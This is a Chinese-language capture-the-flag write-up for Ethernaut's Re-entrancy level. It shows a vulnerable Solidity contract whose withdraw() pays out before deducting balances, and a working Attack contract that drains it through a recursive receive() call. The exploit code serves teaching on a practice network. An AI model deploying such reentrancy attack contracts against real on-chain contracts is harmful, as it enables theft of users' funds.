#   Level 9 Re-entrancy
實例地址：`0xdDDad271e43B42bCf2600Da9780457172dE03da0`

##  題目說明
這一關的目標是偷走合約的所有資產。

  可能會有用的資訊

*   沒被信任的(untrusted)合約可以在你意料之外的地方執行程式碼
*   fallback 方法
*   拋出(throw)/恢復(revert) 的通知
*   有的時候攻擊一個合約的最好方式是使用另一個合約
*   查看上方幫助頁面 "Beyond the console" 章節

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

##  POC
該合約漏洞位於 `withdraw(uint256)`， `call` 會等待執行結果，所以我們可以撰寫一個攻擊合約使用 `receive()` 的方式進行重入攻擊，這樣可以在 balances 被扣除前再次調用 `withdraw()`。

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Reentrance{
     function withdraw(uint256 _amount) external;
     function donate(address _to) external payable;
}

contract Attack{
    Reentrance public target;

    constructor(address payable _target) payable{
        target = Reentrance(_target);
        target.donate{value:msg.value}(address(this));
    }

    function attack()external payable{
        target.withdraw(0.001 ether);
    }

    receive() external payable{
        target.withdraw(0.001 ether);
    }
}
```